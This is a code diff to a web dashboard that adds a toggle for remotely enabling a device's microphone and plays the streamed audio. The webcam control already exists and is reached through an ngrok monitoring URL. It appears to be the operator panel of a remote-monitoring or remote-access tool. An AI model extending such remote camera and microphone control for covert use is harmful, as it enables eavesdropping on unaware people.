@@ -13,6 +13,11 @@
   border-color: var(--green);
   color: var(--green);
 }
+#mic-toggle-btn.active {
+  background: rgba(166,227,161,0.1);
+  border-color: var(--green);
+  color: var(--green);
+}
 
 :root {
   --bg: #080A0E;
@@ -530,12 +535,23 @@ body::before {
         </div>
 
         <div class="options-box">
-          <div class="options-box-header">Options</div>
-          <div class="options-box-body">
-            <span style="opacity:0.3">⚙️</span>
-            <span>More options coming soon…</span>
-          </div>
-        </div>
+  <div class="options-box-header">Options</div>
+  <div class="options-box-body" style="justify-content:space-between;">
+    <div style="display:flex;align-items:center;gap:10px;">
+      <span id="mic-icon" style="font-size:18px;opacity:0.4">🎙️</span>
+      <div>
+        <div style="color:var(--text);font-size:11px;">Microphone stream</div>
+        <div id="mic-status" style="font-size:10px;color:var(--dim);margin-top:2px;">Toggle to enable</div>
+      </div>
+    </div>
+    <button id="mic-toggle-btn" onclick="toggleMic()" style="
+      background:var(--surface2);border:1px solid var(--border2);border-radius:8px;
+      padding:8px 16px;color:var(--muted);font-family:'JetBrains Mono',monospace;
+      font-size:11px;cursor:pointer;letter-spacing:0.5px;
+      transition:background 0.2s,color 0.2s,border-color 0.2s;white-space:nowrap;
+    ">🎙️ Mic OFF</button>
+  </div>
+</div>
       </div>
     </div>
   </div>
@@ -600,6 +616,56 @@ async function sendWebcamCommand(did, on) {
       body: JSON.stringify({ device_id: did, enable: on })
     });
   } catch (e) { console.warn('webcam cmd failed', e); }
+}
+// ── MICROPHONE ────────────────────────────────────
+let micEnabled = {};
+let audioCtx   = null;
+
+function toggleMic() {
+  if (!currentDevice) return;
+  micEnabled[currentDevice] = !micEnabled[currentDevice];
+  const on = micEnabled[currentDevice];
+  sendAudioCommand(currentDevice, on);
+  updateMicUI(on);
+  if (on && !audioCtx) audioCtx = new AudioContext({ sampleRate: 16000 });
+}
+
+function updateMicUI(on) {
+  const btn    = document.getElementById('mic-toggle-btn');
+  const status = document.getElementById('mic-status');
+  const icon   = document.getElementById('mic-icon');
+  btn.textContent = on ? '🎙️ Mic ON' : '🎙️ Mic OFF';
+  btn.className   = on ? 'active' : '';
+  status.textContent = on ? 'Streaming…' : 'Toggle to enable';
+  icon.style.opacity = on ? '1' : '0.4';
+}
+
+async function sendAudioCommand(did, on) {
+  const base = localStorage.getItem('monitor_url');
+  if (!base) return;
+  try {
+    await fetch(base + '/audio_cmd', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'ngrok-skip-browser-warning': 'true' },
+      body: JSON.stringify({ device_id: did, enable: on })
+    });
+  } catch (e) { console.warn('audio cmd failed', e); }
+}
+
+function playAudioChunk(b64) {
+  if (!audioCtx) return;
+  const raw   = atob(b64);
+  const pcm16 = new Int16Array(raw.length / 2);
+  for (let i = 0; i < pcm16.length; i++)
+    pcm16[i] = (raw.charCodeAt(i*2+1) << 8) | raw.charCodeAt(i*2);
+  const float32 = new Float32Array(pcm16.length);
+  for (let i = 0; i < pcm16.length; i++) float32[i] = pcm16[i] / 32768;
+  const buf = audioCtx.createBuffer(1, float32.length, 16000);
+  buf.copyToChannel(float32, 0);
+  const src = audioCtx.createBufferSource();
+  src.buffer = buf;
+  src.connect(audioCtx.destination);
+  src.start();
 }
 function doLogout() {
   document.getElementById('app').classList.remove('visible');
@@ -700,8 +766,13 @@ async function connectFetch(base, signal) {
               nof.style.display = 'none';
               document.getElementById('webcam-status').textContent = 'Live ●';
             }
+            } else if (msg.type === 'audio_chunk') {
+            if (currentDevice === msg.device && micEnabled[currentDevice]) {
+              playAudioChunk(msg.data);
+            }
+          }
         
-}
+
         }
       }
     } catch (err) {
@@ -824,6 +895,8 @@ async function openViewer(did) {
   // reset webcam panel for new device
 const isOn = !!webcamEnabled[did];
 updateWebcamUI(isOn);
+const isMicOn = !!micEnabled[did];
+  updateMicUI(isMicOn);
 
   // Show hostname as the viewer title (fallback to device id)
   document.getElementById('viewer-name').textContent = info.hostname || did;
